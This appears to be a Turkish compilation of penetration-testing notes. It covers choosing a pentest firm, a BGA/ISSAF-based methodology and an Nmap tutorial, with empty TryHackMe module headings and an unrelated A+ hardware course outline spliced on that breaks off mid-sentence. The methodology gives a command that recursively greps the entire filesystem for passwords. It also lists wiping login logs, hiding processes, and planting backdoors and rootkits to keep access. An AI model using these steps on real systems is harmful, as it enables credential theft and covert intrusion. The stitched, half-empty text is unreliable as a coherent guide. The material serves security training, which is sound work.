● Ne kadar sıklıkla yaptırmalıyım
 ● Riskli sistem ve servisler kapsam dışı olmalı mı yoksa riski kabul edip sonucunu görmelimiyim. 
● DDOS denemesi yapılacak mı 
● Pentest sonuç raporundaki zafiyetleri kapatmak icin idari gücüm var mı?

 





Müşteri İçin Pentest Proje Zaman Çizelgesi 
1. Pentest yapmak için karar verilir 
2. Temel kapsam belirlenir . Hangi bileşenlerin test edileceği konusunda Kapsam Belirleme kısmı yardımcı olacaktır. 
3. Firma araştırması [Firma seçimi konusunda dikkat edilmesi gereken maddeler incelenmeli
4. Firmalardan teklif toplama 
5. Firmalardan kapsam önerilerini isteme 
6. Firmalardan örnek sızma test raporu isteme 
7. Gerekli durumda kapsam belirleme için firmayla ek toplantılar 8. Firmaya karar verme ve sızma testlerine başlama

Sızma Testlerinde Kapsam Belirleme Çalışması Sızma testinde ana amaçlardan biri tüm zafiyetlerin degerlendirilerek sisteme sızılmaya çalışılmasıdır. Bu amaç doğrultusunda gerçekleştirilecek sızma testlerinde kapsam pentest çalışmasının en önemli adımını oluşturmaktadır. Sistem/ağ yöneticileri ile hackerların bakış açısı farklıdır ve sitem/ağ yöneticisi tarafından riskli görülmeyen bir sunucu/sistem hacker için sisteme sızmanın ilk adımı olabilir. Bu nedenle kapsam çalışmalarında mutlaka pentest yaptırılacak kişi/firma ile ortaklaşa hareket edilmelidir. Aşağıdaki resim kapsam konusunun önemimi çok iyi göstermektedir.
 
Kapsam belirlemek için standart bir formül yoktur. Her firma ve ortam için farklı olabilmektedir. Genellikle sızma testleri aşağıdaki gibi alt bileşenlere ayrılmaktadır
. ● Web uygulama sızma testleri
 ● Son kullanıcı ve sosyal mühendislik testleri 
● DDoS ve performans testleri 
● Ağ altyapısı sızma testleri 
● Yerel ağ sızma testleri 
● Mobil uygulama güvenlik testleri
● Sanallaştırma sistemleri sızma testleri 
Kapsam belirleme konusunda sızma testini gerçekleştirecek firma ve hizmeti alacak firma birlikte karar vermelidir. Genellikle hizmet alan firma maliyetleri düşürmek için kapsamı olabildiğince daraltmaya çalışmakta ve kapsam olarak güvenli olduğu düşünülen sistemlerin ip adresleri verilmekte ya da örnekleme yapılmaya çalışılmaktadır. Oysa sızma testlerinde ana amaçlardan birisi en zayıf noktayı kullanarak sisteme sızmak, sızılabildiğini göstermektir. Kapsam konusunda sadece ip adresi alarak sızma testi yapılmaz. Bir web uygulamasını test etmek ile DNS sunucuyu, güvenlik duvarını test etmek çok farklıdır. Yine statik içerik barındıran bir web sitesi ile dinamik içerik barındıran web sayfasını test etmek de içerik ve üzerine harcanan emek açısından oldukça farklıdır.

 Firma Seçimi Sızma testleri sonuçları somut olmayan hizmetler kapsamındadır. Firmalar kendilerinin uzman olduklarını farklı şekilde ortaya koyabilirler. Bunlardan en önemlisi firmanın referansları ve bu konuda çalıştırdığı kişilerin yetkinliği ve firmanın sızma testlerine olan ilgisidir. Güvenlik ürün çözümleri sunup yanında sızma testleri yapan firmalar genellikle halihazırda sundukları ürünleri satabilmek için sızma testleri gerçekleştirir ve sonuçları daha çok ürün satmaya yönelik olur. Tek işi sızma testleri ve benzeri hizmetler vermek olan firmalar bu konuda daha öncelikli olarak değerlendirilmelidir. Firma seçimi konusunda yardımcı olabilecek bazı maddeler aşağıdaki gibi sıralanabilir. 
 Firmada test yapacak çalışanların CVlerini isteyin . Varsa testi yapacak çalışanların konu ile ilgili sertifikasyonlara sahip olmasını ercih edin. 
 Testi yapacak çalışanların ilgili firmanın elemanı olmasına dikkat edin. 
 Firmaya daha önceki referanslarını sorun ve bunlardan birkaçına memnuniyetlerini sorun.
  Mümkünse firma seçimi öncesinde teknik kapasiteyi belirlemek için tuzak sistemler kurarak firmaların bu sistemlere saldırması ve sizin de bildiğiniz açıklığı bulmalarını isteyin. 

 Firmadan daha önce yaptığı testlerle ilgili örnek raporlar isteyin.
 Testlerin belirli ip adreslerinden yapılmasını ve bu ip adreslerinin size bildirilmesini talep edin.
  Firmaya test için kullandıkları standartları sorun. 
 Firmanın test raporunda kullandığı tüm araçları da yazmasını isteyin.
  Pentest teklifinin diğerlerine göre çok düşük olmaması En önemli maddelerden biri Penetration test firmanın özel işi mi yoksa oylesine yaptığı bir iş mi? Bu sorgu size firmanın konu hakkında yetkinliğine dair ipuçları verecektir. Ücretiz sızma testi hizmeti veren firmalar genellikle sızma testi konusunu yan iş olarak yapmaktadır ve bu konuda alınacak hizmetin kalitesi sıfıra yakın olacaktır. Sızma testleri tamamen uzmanlık alanı bu olan kişi/firmalara bırakılmalıdır. Genellikle ürün satmak için ücretsiz sızma testleri gerçekleştiren firmaların yapacağı sızma testleri otomatik araçlarla taramanın ötesine geçememektedir.

Sızma Test Metodolojisi Kullanımı İşinin ehli bir hacker kendisine hedef olarak belirlediği sisteme sızmak için daha önce edindiği tecrübeler ışığında düzenli bir yol izler. Benzeri şekilde sızma testlerini gerçekleştiren uzmanlar da çalışmalarının doğrulanabilir, yorumlanabilir ve tekrar edilebilir olmasını sağlamak için metodoloji geliştirirler veya daha önce geliştirililen bir metodolojiyi takip ederler. Metodoloji kullanımı bir kişilik olmayan sızma test ekipleri için hayati önem taşımaktadır ve sızma testlerinde daha önce denenmiş ve standart haline getirilmiş kurallar izlenirse daha başarılı sonuçlar elde edilir Internet üzerinde ücretsiz olarak edinilebilecek çeşitli güvenlik testi kılavuzları bulunmaktadır. 
Bunların başında ; 
• OWASP(Open Web Application Security Project) 
• OSSTMM(The Open Source Security Testing Methodology Manual)
 • ISSAF(Information Systems Security Assessment Framework) 
• NIST SP800-115 gelmektedir. Internetten ücretsiz edinilebilecek bu test metodojileri incelenerek yapılacak güvenlik denetim testlerinin daha sağlıklı ve tekrar edilebilir sonuçlar üretmesi sağlanabilir. Metodoloji hazırlanmasında dikkat edilmesi gereken en önemli hususlardan biri sızma test metodolojisinin araç tabanlı (X adımı icin Y aracı kullanılmalı gibi) olmamasına dikkat edilmesidir.

BGA Sızma Test Metodolojisi Sızma testlerinde ISSAF tarafından geliştirilen metodoloji temel alınmıştır. Metodolojimiz üç ana bölümde dokuz alt bölümden oluşmaktadır.
 

1.1 [Bilgi Toplama] Amaç, hedef sistem hakkında olabildiğince detaylı bilgi toplamaktır. Bu bilgiler firma hakkında olabileceği gibi firma çalışanları hakkında da olabilir. Bunun için internet siteleri haber gruplari e-posta listeleri , gazete haberleri vb., hedef sisteme gönderilecek çeşitli paketlerin analizi yardımcı olacaktır.



Bilgi toplama ilk ve en önemli adımlardan biridir. Zira yapılacak test bir zaman işidir ve ne kadar sağlıklı bilgi olursa o kadar kısa sürede sistemle ilgili detay çalışmalara geçilebilir. Bilgi toplamada aktif ve pasif olmak üzere ikiye ayrılır. Google, pipl, Shodan, LinkedIn, facebook gibi genele açık kaynaklar taranabileceği gibi hedefe özel çeşitli yazılımlar kullanılarak DNS, WEB, MAIL sistemlerine yönelik detaylı araştırmalar gerçekleştirilir. Bu konuda en iyi örneklerden biri hedef firmada çalışanlarından birine ait e-posta ve parolasının internete sızmış parola veritabanlarından birinden bulunması ve buradan VPN yapılarak tüm ağın ele geçirilmesi senaryosudur. 
Sızma testlerinde bilgi toplama adımı için kullanılabilecek temel araçlar: 
• FOCA 
• theharvester 
• dns 
• Google arama motoru
 • Shodan arama motoru 
• E-posta listeleri, LinkedIn, Twitter ve Facebook

1.2 [Ağ Haritalama] Amaç hedef sistemin ağ yapısının detaylı belirlenmesidir. Açık sistemler ve üzerindeki açık portlar, servisler ve servislerin hangi yazılımın hangi sürümü olduğu bilgileri, ağ girişlerinde bulunan VPN, Firewall, IPS cihazlarının belirlenmesi, sunucu sistemler çalışan işletim sistemlerinin ve versiyonlarının belirlenmesi ve tüm bu bileşenler belirlendikten sonra hedef sisteme ait ağ haritasının çıkartılması Ağ haritalama adımlarında yapılmaktadır. Ağ haritalama bir aktif bilgi toplama yöntemidir. Ağ haritalama esnasında hedef sistemde IPS, WAF ve benzeri savunma sistemlerinin olup olmadığı da belirlenmeli ve gerçekleştirilecek sızma testleri buna göre güncellenmelidir. Ağ Haritalama Amaçlı Kullanılan Temel Araçlar • Nmap, • unicornscan 
1.3 [Zafiyet/Zayıflık Tarama Süreci] Bu sürecin amacı belirlenen hedef sistemlerdeki açıklıkların ortaya çıkarılmasıdır. Bunun için sunucu servislerdeki bannerler ilk aşamada kullanılabilir. Ek olarak birden fazla zayıflık tarama aracı ile bu sistemler ayrı ayrı taranarak oluşabilecek false positive oranı düşürülmeye çalışılır.

Bu aşamada hedef sisteme zarar vermeycek taramalar gerçekleştirilir. Zayıflık tarama sonuçları mutlaka uzman gözler tarafından tekrar tekrar incelenmeli, olduğu gibi rapora yazılmamalıdır. Otomatize zafiyet tarama araçlar ön tanımlı ayarlarıyla farklı portlarda çalışan servisleri tam olarak belirleyememktedir.
 Zafiyet Tarama Amaçlı Kullanılan Temel Araçlar 
• Nessus 
• Nexpose 
• Netsparker 
2.1 [Penetrasyon(Sızma) Süreci] Belirlenen açıklıklar için POC kodları/araçları belirlenerek denelemeler başlatılır. Açıklık için uygun araç yoksa ve imkan varsa ve test için yeteri kadar zaman verilmişse sıfırdan yazılır. Genellikle bu tip araçların yazımı için Python, Ruby gibi betik dilleri tercih edilir. Bu adımda dikkat edilmesi gereken en önemli husus çalıştırılacak exploitlerden önce mutlaka yazılı onay alınması ve mümkünse lab ortamlarında önceden denenmesidir. 
Sızma Sürecinde Kullanılan Temel Araçlar
 • Metasploit, Metasploit Pro 
• Core Impact, Immunity Canvas 
• Sqlmap 
• Fimap 
2.2 [Erişim Elde Etme ve Hak Yükseltme] Sızma sürecinde amaç sisteme bir şekilde giriş hakkı elde etmektir. Bu süreçten sonra sistemdeki kullanıcının haklarının arttırılması hedeflenmelidir. Linux sistemlerde çekirdek (kernel) versiyonunun incelenerek priv. escelation zafiyetlerinin belirlenmesi ve varsa kullanılarak root haklarına erişilmesi en klasik hak yükseltme adımlarından biridir. Sistemdeki kullanıcıların ve haklarının belirlenmesi, parolasız kullanıcı hesaplarının belirlenmesi, parolaya sahip hesapların uygun araçlarla parolalarının bulunması bu adımın önemli bileşenlerindendir.

Hak Yükseltme Amaç edinilen herhangi bir sistem hesabı ile tam yetkili bir kullanıcı moduna geçişttir.(root, administrator, system vs) Bunun için çeşitli exploitler denenebilir. Bu sürecin bir sonraki adıma katkısı da vardır. Bazı sistemlere sadece bazı yetkili makinelerden ulaşılabiliyor olabilir. Bunun için rhost, ssh dosyaları ve mümkünse history’den eski komutlara bakılarak nerelere ulaşılabiliyor detaylı belirlemek gerekir.

 2.3 [Detaylı Araştırma] Erişim yapılan sistemlerden şifreli kullanıcı bilgilerinin alınarak daha hızlı bir ortamda denenmesi. Sızılan sistemde sniffer çalıştırılabiliyorsa ana sisteme erişim yapan diğer kullanıcı/sistem bilgilerinin elde edilmesi. Sistemde bulunan çevresel değişkenler ve çeşitli network bilgilerinin kaydedilerek sonraki süreçlerde kullanılması. Linux sistemlerde en temel örnek olarak grep komutu kullanılabilir. grep parola|password|sifre|onemli_kelime -R / 




3.1 [Erişimlerin Korunması] Sisteme girildiğinin başkaları tarafından belirlenmemesi için bazı önlemlerin alınmasında fayda vardır. Bunlar giriş loglarının silinmesi, çalıştırılan ek proseslerin saklı olması , dışarıya erişim açılacaksa gizli kanalların kullanılması(covert channel), backdoor, rootkit yerleştirilmesi vs. 
3.2 [İzlerin silinmesi ] Hedef sistemlere bırakılmış arka kapılar, test amaçlı scriptler, sızma testleri için eklenmiş tüm veriler not alınmalı ve test bitiminde silinmelidir. 
3.3 [Raporlama] Raporlar bir testin müşteri açısından en önemli kısmıdır. Raporlar ne kadar açık ve detaylı/bilgilendirici olursa müşterinin riski değerlendirmesi ve açıklıkları gidermesi de o kadar kolay olur. Testler esnasında çıkan kritik güvenlik açıklıklarının belgelenerek sözlü olarak anında bildirilmesi test yapan takımın görevlerindendir. Bildirimin ardından açıklığın hızlıca giderilmei için çözüm önerilerinin de birlikte sunulması gerekir. Ayrıca raporların teknik, yönetim ve özet olmak üzere üç farklı şekilde hazırlanmasında fayda vardır. Teknik raporda hangi uygulama/araçların kullanıldığı, testin yapıldığı tarihler ve çalışma zamanı, bulunan açıklıkların detayları ve açıklıkların en hızlı ve kolay yoldan giderilmesini amaçlayan tavsiyeler bulunmalıdır.

Zamanlama Hedef sistemlerin kritiklik durumlarına göre sızma testlerinin zamanlaması ayarlanmalıdır. DDoS testlerinin genellikle hafta sonu ve gece yarısı gerçekleştirilmesi önerilmektedir. Bunun haricinde diğer testlerin gün içinde veya mesai saatleri sonrası yapılması tamamen müşterinin talebine bağlı değişkenlik göstermektedir. Fakat hedef sistemi performans açısından zorlayabilecek taramalar mesai saatleri dışında yapılması tercih edilmelidir.

Exploit Denemeleri Sızma testlerinin en önemli adımlarıdan biri exploiting aşamasıdır. Bu adımla hedef sistem üzerinde bulunan güvenlik zafiyetleri istismar edilir ve sisteme sızılacak yollar belirlenebilir. Test yapan firmanın kalitesinin göstergelerinden biri de bu adımıdaki başarılarıdır. Exploit çalıştırma denemelerinde mutlaka müşteri tarafı ile koordinasyon içinde olunmalı. Aksi hale hedef sistemi ele geçirmek amacıyla çalıştırılan bir exploit hedef sistemin bir daha açılmamasına, yeniden başlamasına ya da veri kaybına sebep olabilir. BGA olarak genellikle test yapılacak firmalara ait bilişim sistemlerinin bir kopyaları kendi lab ortamımızda kurulu ve exploit öncesi denemeler gerçekleştirilir. 
Pentest Çalışmasının Kayıt Altına Alınması Bazı durumlarda hedef sistemde istenmeyen, beklenmeyen sonuçlar yaşanabilir. Testler esnasında hedef sistemden verilerin silinmesi, test yapılan ağın çökmesi, veya müşteri bilgilerinin internet ortamına sızması gibi. Bu gibi durumlarda sızma testlerini gerçekleştiren firmanın kendini sağlama alması açısından tüm sızma test adımlarının raw paket olarak kayıt altına alması önemlidir. Yaşanabilecek herhangi bir olumsuz durumda kayıt altına alınan paketlerden problem çözümü kolaylıkla sağlanabilir. Pentest yapacak firma ne kadar güvenili olsa da-aranizda muhakkak imzalı ve maddeleri açık bir NDA olmalı- siz yine de kendinizi sağlama alma açısından firmanın yapacağı tüm işlemleri loglamaya çalışın.

Raporlama Sızma testlerinin en önemli bileşenlerinden biri raporlamadır. Ticari açıdan yaklaşıldığında pentest yaptıran müşteri rapora para vermektedir. Dolayısıyla pentest raporunun olabildiğince detaylı ve müşteriyi doğru yönlendirecek nitelikte olması gerekir. Doğrudan otomatik analiz ve tarama araçlarının çıktılarını rapora eklemek müşterinin karşılaşmak istemediği durumların başında gelmektedir.

 Raporun İletimi Raporun mutlaka şifreli bir şekilde müşteriye ulaştırılması gerekir. Raporu açmak için gerekli olan parolanın e-posta harici başka bir yöntemle müşteriye ulaştırılabilir. Sık tercih edilen yöntem SMS kullanımıdır.








 
● Sistem yöneticileri/yazılımcılarla toplantı yapıp sonuçların paylaşılması 
● Açıklıkların kapatılmasının takibi 
● Bir sonraki pentestin tarihinin belirlenmesi 
Sızma Testlerinde Kullanılan Araçlar: Öncelikle sızma test kavramının araç bağımsız olduğunu belirtmek gerekir. Bu konudaki yazılımlar Açık kodlu bilinen çoğu pentest yazılımı Backtrack güvenlik CDsi ile birlikte gelir. Bu araçları uygulamalı olarak öğrenmek isterseniz Backtrack ile Penetrasyon testleri eğitimine kayıt olabilirsiniz. 

Ticari Pentest Yazılımları: Immunity Canvas, Core Impact, HP Webinspect, Saint Ssecurity Scanner 

Sızma Testleri Konusunda Uzmanlık Kazanma Pentest konusunda kendinizi geliştirmek için öncelikle bu alana meraklı bir yapınızın olmasın gerekir. İçinizde bilişim konularına karşı ciddi merak hissi , sistemleri bozmaktan korkmadan kurcalayan bir düşünce yapınız yoksa işiniz biraz zor demektir. Zira pentester olmak demek başkalarının düşünemediğini düşünmek, yapamadığını yapmak ve farklı olmak demektir. Bu işin en kolay öğrenimi bireysel çalışmalardır, kendi kendinize deneyerek öğrenmeye çalışmak, yanılmak sonra tekrar yanılmak ve doğrsunu öğrenmek. Eğitimler bu konuda destekci olabilir. Sizin 5-6 ayda katedeceğiniz yolu bir iki haftada size aktarabilir ama hiçbir zaman sizi tam manasıyla yetiştirmez, yol gösterici olur. Pentest konularının konuşulduğu güvenlik listelerine üyelik de sizi hazır bilgi kaynaklarına doğrudan ulaştıracak bir yöntemdir. Linux öğrenmek, pentest konusunda mutlaka elinizi kuvvetlendirecek, rakiplerinize fark attıracak bir bileziktir. Bu işi ciddi düşünüyorsanız mutlaka Linux bilgisine ihtiyaç duyacaksınız.
 Sızma Testleri Konusunda Verilen Eğitimler
 ● Bilgi Güvenliği AKADEMİSİ Pentest Eğitimleri
 ● Ec-Council Pentest Eğitimleri ● SANS Pentest Eğitimleri ● Offensive Security Pentest Eğitimleri







TRY HACK ME(LINUX FUNDAMENTALS/NETWORKING FUNDAMENTALS/WEB HACKING FUN./CRYPTOGRAPHY/WINDOWS FUN./SHELLS AND PRIVILEGE ESCALATION/BASIC COMPUTER EXPLOITATION)

LINUX FUNDAMENTALS
 
 
 
 
 
 
 
 

 
 
 
 
 
 
 
 
 
 

 
 
 
 
 
   

         







Networking Fundamentals
 
 
 

 
 

 
 

 
 
 
 

 
 
 
 
 
 




 
 
 
 
 
	









Nmap
 
 
Nmap Nmap, bilgisayar ağları uzmanı Gordon Lyon (Fyodor) tarafından C/C++ ve Python programlama dilleri kullanılarak geliştirilmiş bir güvenlik tarayıcısıdır. Taranan ağın haritasını çıkarabilir ve ağ makinalarında çalışan servislerin durumlarını, işletim sistemlerini, portların durumlarını gözlemleyebilir. 
Nmap kullanarak ağa bağlı herhangi bir bilgisayarın işletim sistemi, çalışan fiziksel aygıt tipleri, çalışma süresi, yazılımların hangi servisleri kullandığı, yazılımların sürüm numaraları, bilgisayarın ateşduvarına sahip olup olmadığı, ağ kartının üreticisinin adı gibi bilgiler öğrenilebilmektedir. 
Nmap tamamen özgür GPL ( General Public Licence ) lisanslı yazılımdır ve istendiği takdirde sitesinin ilgili bölümünden kaynak kodu indirilebilmektedir. 
Nmap kullanım alanları :
 • Herhangi bir ağ hazırlanırken gerekli ayarların test edilmesinde. 
• Ağ envanteri tutulması, haritalaması, bakımında ve yönetiminde. 
• Bilinmeyen yeni sunucuları tanımlayarak, güvenlik denetimlerinin yapılması. 
Nmap Çalışma Prensibi Nmap çok güçlü bir uygulama olmasına rağmen, yeni başlayanlar için anlaşılması zordur. Nmap yaklaşık 15 farklı tarama yöntemine ve her tarama için yaklaşık 20 farklı seçeneğe (çıktı seçenekleri dahil) sahiptir. Nmap tarama süreci ile ilgili bilgiler aşağıda belirtilmiştir :
 1. Taranılacak olan hedef makinanın ismi girilirse, Nmap öncellikle DNS lookup işlemi yapar. Bu aslında bir Nmap fonksiyonu değil, ancak DNS sorguları network trafiğinde gözüktüğünden beri, her durum loglanır. Bu yüzden isim ile tarama yapmadan önce bunun bilinmesinde fayda vardır. Eğer isim yerine IP girilirse, DNS lookup işlemi yapılmayacaktır. DNS lookup işleminin iptal edilmesinin bir yolu bulunmuyor, sadece Nmapin üzerinde bulunduğu makinanın host veya lmhost dosyalarının içinde IP – DNS eşleşmesi varsa DNS lookup yapılmaz. 
2. Nmap hedef makinayı “ping”ler. Ancak bu bilinen ICMP ping işlemi değildir. Nmap farklı bir ping işlemi kullanır. Bu işlem hakkında bilgi ilerleyen bölümlerde verilecektir. Eğer ping işlemini iptal edilmek isteniyorsa –P0 seçeneği kullanılmalıdır. 
3. Eğer hedef makinanın IP adresi belirtildiyse, Nmap reverse DNS lookup yaparak IP – Hostname eşleşmesi yapar. Bu 1. Adımda gerçekleştirilen olayın tersidir. Bu işlem, ilk adımda DNS lookup yapılmasına rağmen gereksiz gözükebilir. Ancak IP-Hostname sonuçları ile Hostname-IP sonuçları farklı çıkabilir. 
 

Yetki Yükseltme Nmap seçeneklerinin hepsi ve işletim sistemi kontrollerini gerçekleştiren yapıları bypass etmek için özelleştirilmiş “raw” paketler, sadece yüksek yetkilere sahip kullanıcıların taramalarında bulunabilir. Unix,Linux için root, Windows için Administrator olmak gerekir.
 Sunucuları/İstemcileri Keşfetme Organizasyon içerisindeki hostları bulmak için çok önemli bir yöntemdir. Keşfetme işlemi için birçok seçenek kullanılabilir. En basit yolu bir ping scan gerçekleştirmektir : ( Ping Scan hakkında detaylı bilgi Tarama bölümünde mevcuttur. )




#nmap -sP 192.168.2.0/24 
Host 192.168.2.1 appears to be up.
 Host 192.168.2.3 appears to be up. 
Host 192.168.2.4 appears to be up. 
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.281 seconds 
Ping scan belirtilen hedef veya hedeflerin 80. portuna ICMP echo request ve TCP ACK ( root veya Administrator değilse SYN ) paketleri gönderir. Hedef veya hedeflerden dönen tepkilere göre bilgiler çıkartılır. Hedef/hedefler Nmap ile aynı yerel ağda bulunuyorsa, Nmap hedef/hedeflerin MAC adreslerini ve ilgili üreticiye ait bilgileri (OUI ) sunar. Bunun sebebi, Nmap varsayılan olaran ARP taraması, -PR, yapar. Bu özelliği iptal etmek için- -send-ip seçeneği kullanılabilir. Ping scan portları taramaz yada başka tarama tekniklerini gerçekleştirmez. Ping scan network envanteri vb. işlemler için idealdir.
Keşfetme işlemleri için bazı seçenekler aşağıda sunulmuştur :
 • -sL: List Scan – Hedefleri ve DNS isimlerinin bir listesini çıkarır.
 • -sn: Ping Scan - Port scan seçeneğini iptal eder. 
• -Pn: Host discovery yapılmaz, bütün hostlar ayakta gözükür.
 • -n/-R: Asla DNS Çözümlemesi yapılmaz/Herzaman DNS çözümlemesi yapılır *varsayılan: bazen]
 • --dns-servers : Özel DNS serverlerı belirtmek için kullanılır. 
• --system-dns: OS e ait DNS çözümleyici kullanılır. 
• --traceroute: Traceroute özelliğini aktif hale getirir. TCP Connect ve Idle Scan dışındaki tarama türleri ile yapılmaz.
• -p : port veya port aralıklarını belirtmek için kullanılır. -p22; -p1-65535; -p U:53,111,137,T:21- 25,80,139,8080,S:9
 • -F: Fast mode, varsayılan taramalarda belirlenen portlardan biraz daha azı kullanılır.
 • -r: Portları sırayla tarar. Rastgele tarama kullanılmaz.
 • --top-ports : ile belirtilen ortak portları taranır.
 • p--port-ratio : Belirtilen üzerinden ortak portlar taranır.
 • - -randomize_hosts, -rH : Listede belirtilen taranılacak hostları rastgele bir şekilde seçer.
 • - -source_port, -g : Taramayı yapacak olan makinanın kaynak portunu belirlemek amacıyla kullanılır.
 • -S : Kaynak IP yi belirlemek amacıyla kullanılır. 
• -e : Network arayüzünü belirlemek amacıyla kullanılır.
Tarama Nmap herhangi bir client veya serverı birçok farklı şekilde tarama yeteneğine sahiptir. Nmapin asıl gücü farklı tarama tekniklerinden gelir. Protokol bazlı ( Tcp, Udp vb. ) tarayabileceğiniz gibi, belirli aralıklardaki ipler, subnetler ve üzerlerinde çalışan port ve servisleride taranabilir. 
Portların Taramalara Verebileceği Cevaplar Tarama sonuçlarında ortaya çıkabilecek port durumları aşağıdaki gibidir :
 • Open : Portlar açık ve aktif olarak TCP veya UDP bağlantısı kabul eder. 
• Closed : Portlar kapalı ancak erişilebilir. Üzerlerinde dinlenilen aktif bir bağlantı yoktur. 
• Filtered : Dönen tepkiler bir paket filtreleme mekanizması tarafından engellenir. Nmap portun açık olduğuna karar veremez.
 • Unfiltered : portlar erişilebilir ancak Nmap portların açık veya kapalı olduğuna karar Pveremez. (Sadece ACK scan için ) 
• Open|filtered : Nmap portların açık veya filtrelenmiş olduğuna karar veremez. (UDP, IP Proto, FIN, Null, Xmas Scan için )
 • Closed|filtered : Nmap portların kapalı yada filtreli olduğuna karar veremez. ( Sadece Idle Scan için ) Taramalar esnasında Nmapin performansının düşmemesi ve çıktıların daha düzenli olmasıyla amacıyla –v yada –vv seçenekleri kullanılabilir. Bu seçenekler vasıtasıyla Nmap bize sunacağı çıktıları limitler. –vv kullanılırsa, Nmape ait istatistikler görülmez ve en sade çıktı alınır.
 
Bu taramayı gerçekleştirmek için aşağıdaki komut kullanılmalıdır :  nmap -sT -v [Hedef_IP]

 





XMas Tree Scan
 
 
 


Ping Scan 
Kaynak makinanın hedef makinaya tek bir ICMP Echo istek paketi göndereceği bu tarama türünde, IP adresi erişilebilir ve ICMP filtreleme bulunmadığı sürece, hedef makina ICMP Echo cevabı döndürecektir :
 
Version Detection 
Version Detection, bütün portların bilgilerini bulabilecek herhangi bir tarama türü ile beraber çalışır. Eğer herhangi bir tarama türü belirtilmezse yetkili kullanıcılar ( root, admin ) için TCP SYN, yetkisiz kullanıcılar için TCP Connect Scan çalıştırılır.

 
UDP Scan Kaynak makinanın göndereceği UDP paketine ICMP Port Unreachable cevabı döndüren hedef makina kapalı kabul edilecektir. :
 

 
 





ACK Scan
Kaynak makinanın hedef makinaya TCP ACK bayraklı paket göndereceği bu tarama türünde, hedef makina tarafından ICMP Destination Unreachable mesajı dönerse yada herhangi bir tepki oluşmazsa port “filtered” olarak kabul edilir :
 
 

Window Scan -Window Scan, ACK Scan türüne benzer ancak bir önemli farkı vardır. Window Scan portların açık olma durumlarını yani “open” durumlarını gösterebilir. Bu taramanın ismi TCP Windowing işleminden
 
 

 


 
WEB FUNDAMENTALS
 
 
 
 
 
 
CRYPTO 101
 
 
 
 
 




 
 

 
 
 
 
 

METASPLOIT
 
 
 
	
 
 
 
 
 
	 		 

 
 
 

	 






 
 

 
	
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
  
 
 
 
 
 
 

 
 
 
 
 
 
 
 
 
 


 
 











 


 


 


 
 
 
 









INTRODUCTION
Chapter 1. Intoduction to Computers
Bu giris modülünde bilgisayarın tarihçesi üzerinde duruluyor. Dünden
bugüne nasıl değişimler olmuş, bilgisayarlar odalar büyüklüğünden, hem
taşınabilir hem de süper hızlı duruma nasıl gelmişler göreceğiz.
(tartışılmayacak - okunacak) Ayrıca bir “Computer Teknisyeninin”
görevleri nelerdir tartışacağız.
Chapter 2. Understanding Electronic Communication
Bu bölümde, bilgisayarlar anlaşmak için nasıl bir dil kullanırlar,
bizim anlaşabilmek için kullandığımız dille bilgisayarların dilleri
arasındaki benzerlikleri ve farklılıkları tartışacağız.
Chapter 3. An Overview of the Personal Computer
Başlıktan da anlaşılabileceği gibi, PC’lerin başlıca hardware -
donanım elemanları nelerdir, ne amaçla kullanılırlar, inceleyeceğiz.
Hangi donanımlar “Input Unit”, hangileri “Processing Unit” ve hangileri
“Output Unit”tir inceleyeceğiz.
Chapter 4. The Central Processing Unit - CPU
Bu bölümde microprosesörlerin gelişimini, bu gelişim esnasında elde
edilen farklılıkları ve bu prosesörleri nasıl tanıyacağımızı
öğreneceğiz. Tabi ki nasıl çalıştıkları ve tam olarak ne işe
yaradıklarını da tartışıyor olacağız.
Chapter 5. Power Supplies
Bu bölümde Power Supply nasıl çalışır ve bir problem yaşadığımızda
sorunu giderebilmek için neler yapmamız gerektiğini tartışacağız.
Chapter 6. Motherboard and ROM BIOS
Bu bölümde Anakart’ın dizaynı ve ne işe yaradığını, bios’un nasıl çalıştığını tartışıyor olacağız.
Chapter 7. Memory - RAM
Bu bölümde, bilgisayarda kullanılabilecek memory tiplerinin neler
olduklarını, memorylerin ne için kullanıldıklarını, nasıl upgrade
edebileceğimizi veya değiştirebileceğimizi tartışıyor olacağız.
Chapter 8. Expansion Buses, Cables and Connectors
Bu bölümde, bilgisayar komponentlerinin anakarta takılmasını
sağlayan slotları tanıyacağız. AGP (Accelerated Graphics Board)
slotunun çıkmasıyla birlikte anakartlarda ne gibi değişiklikler
yaşanmış ve bunlar ne işe yaramış tartışıyor olacağız.
Chapter 9. Basic Disk Drives
Bu bölümde floppy ve hard diskleri tanıyor olacağız. Mass storage device’lar nasıl çalışır ve limitleri nelerdir göreceğiz.
Chapter 10. Advanced Disk Drive Technology
Bu bölümde de disk driveları incelemeye devam ederek, daha gelişmiş
donanımlar olan CD-ROM, DVD ve SCSI (Small Computer System Interface)
teknolojilerini tartışıyor olacağız.
Chapter 11. The Display System
Bu bölümde, monitörlerin çalışma mantıklarını, flat screen
panelleri, ekran kartlarını ve nasıl troubleshoot yapacağımızı
tartışıyor olacağız.
Chapter 12. Printers
Bu bölümde printer türlerini, PC’lere nasıl kuracağımızı, bakımını ve korumasını nasıl yapacağımız inceleyeceğiz.
Chapter 13. Portable Computers
Bu bölümde de taşınabilir bilgisayarlar hakkında tartışıyor olacağız.
Chapter 14. Connectivity and Networking
Bu bölümde, birden çok bilgisayarın bulunduğu bir ortamda
biligisayarları nasıl birbirlerine bağlayacağımızı ve network
teknolojilerini tartışıyor olacağız.
Chapter 15. Telecommunications and the Internet
Bu bölümde modemlerin kurulumu ve kullanımı hakkında tartışıyor
olacağız. Daha farklı bağlantı cihazlarını da inceleyeceğiz ve
internetin gitgide büyüyen önemine bakacağız.
Chapter 16. Operating System Fundamentals
Bu chapterdan itibaren A+ eğitiminin software-işletim sistemi
kısmını inceliyor olacağız. MS-DOS ve DOS tipi command prompt
konularını inceliyor olacağız.
Chapter 17. Introducing and Installing Microsoft Windows
Bu bölümde Windows işletim sistemleri arasındaki farkları ve bunların nasıl kurulacağını inceliyor olacağız.
Chapter 18. Running Microsoft Windows
Bu bölümde, kurmuş olduğumuz işletim sistemlerini (9x, 2000, XP)
nasıl yöneteceğimizi ve bu sistemlerin teknik destek elemanına ne gibi
araçlar sunduğunu inceleyeceğiz.
Chapter 19. Maintaining the Modern Computer
Bu bölümde, işletim sisteminin düzgün ve verimli çalışabilmesi için
neler yapmamız gerektiğini ve hangi tool’lar yardımı ile neleri
gözlemlememiz gerektiğini tartışıyor olacağız.
Chapter 20. Upgrading a Computer
Bu bölümde, kullanılan bilgisayar beklentilerimize cevap vermemeye
başladığında nasıl upgrade yapacağımızı yani belli parçaları yeni, daha
